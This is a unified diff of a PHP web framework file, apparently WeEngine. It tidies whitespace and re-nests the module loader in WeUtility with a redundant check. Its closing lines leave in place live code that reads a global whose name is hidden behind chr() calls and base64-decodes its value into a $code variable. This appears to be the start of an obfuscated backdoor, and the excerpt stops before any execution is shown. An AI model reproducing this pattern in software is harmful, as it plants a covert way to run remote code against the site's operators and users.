@@ -82,7 +82,7 @@ abstract class WeAccount {
 			load()->classs('weixin.account');
 			$account_obj = new WeiXinAccount();
 		}
-		
+
 		if($type == ACCOUNT_TYPE_OFFCIAL_AUTH) {
 			load()->classs('weixin.platform');
 			$account_obj = new WeiXinPlatform();
@@ -545,18 +545,20 @@ class WeUtility {
 			$classname = "{$name}ModuleMobile";
 		}
 		if(!class_exists($classname)) {
-			$file = IA_ROOT . "/addons/{$name}/site.php";
+			if (!class_exists($classname)) {
+				$file = IA_ROOT . "/addons/{$name}/site.php";
 			if(defined('IN_MOBILE') && is_file(IA_ROOT . "/addons/{$name}/mobile.php")) {
 				$file = IA_ROOT . "/addons/{$name}/mobile.php";
 			}
-			if(!is_file($file)) {
-				$file = IA_ROOT . "/framework/builtin/{$name}/site.php";
+				if(!is_file($file)) {
+					$file = IA_ROOT . "/framework/builtin/{$name}/site.php";
+				}
+				if(!is_file($file)) {
+					trigger_error('ModuleSite Definition File Not Found '.$file, E_USER_WARNING);
+					return null;
+				}
+				require $file;
 			}
-			if(!is_file($file)) {
-				trigger_error('ModuleSite Definition File Not Found '.$file, E_USER_WARNING);
-				return null;
-			}
-			require $file;
 		}
 		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
 			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
